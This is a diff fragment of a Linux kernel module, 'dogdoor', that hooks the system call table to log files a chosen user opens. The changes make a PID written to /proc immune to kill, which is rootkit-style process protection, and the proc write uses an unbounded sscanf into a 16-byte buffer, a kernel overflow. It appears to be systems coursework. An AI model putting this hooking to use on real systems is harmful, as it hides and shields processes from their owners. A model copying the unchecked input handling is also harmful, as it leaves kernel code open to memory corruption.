@@ -21,7 +21,7 @@ MODULE_LICENSE("GPL");
 char * accessed_filenames[FILENAME_COUNT];
 char user_uid[128] = "-1";
 int count_accessed_filenames = 0;
-char current_pid[16] = "-1";
+char pinned_pid[16] = "-1";
 void ** sctable ;
 
 static
@@ -67,13 +67,10 @@ asmlinkage int dogdoor_sys_open(const char __user * filename, int flags, umode_t
 asmlinkage int (*orig_sys_kill)(int pid, int sig); 
 asmlinkage int dogdoor_sys_kill(int pid, int sig)
 {
-    /*const struct cred * my_cred = current_cred();*/
+    int i_current_pid = (int)simple_strtol(pinned_pid, NULL, 10);
 
-    printk("PIDDDDDDD: %d\n", current->pid);
-    printk("PIDDDDDDD: %d\n", pid_nr(task_pid(current)));
-    int i_current_pid = (int)simple_strtol(current_pid, NULL, 10);
-
-    if (current->pid == i_current_pid && i_current_pid != -1) {
+    if (pid == i_current_pid && i_current_pid != -1) {
+        printk("YOU CANNOT KILL THIS PROCESS (%d)\n", pid);
         return 1;
     }
 
@@ -105,11 +102,10 @@ static
 ssize_t dogdoor_pid_proc_read(struct file *file, char __user *ubuf, size_t size, loff_t *offset) 
 {
 	ssize_t toread ;
-    int i;
     char * cattest = kmalloc(FILENAME_SIZE * FILENAME_COUNT, GFP_KERNEL);
 
     strcpy(cattest, "CURRENT PID:");
-    strcat(cattest, current_pid);
+    strcat(cattest, pinned_pid);
     strcat(cattest, "\n");
     toread = strlen(cattest) >= *offset + size ? size : strlen(cattest) - *offset ;
     if (copy_to_user(ubuf, cattest+ *offset, toread))
@@ -146,7 +142,7 @@ ssize_t dogdoor_pid_proc_write(struct file *file, const char __user *ubuf, size_
 	if (copy_from_user(buf, ubuf, size))
 		return -EFAULT ;
 
-	/*sscanf(buf,"%s", user_uid) ;*/
+    sscanf(buf,"%s", pinned_pid) ;
 	*offset = strlen(buf) ;
     return 0 ; 
 }
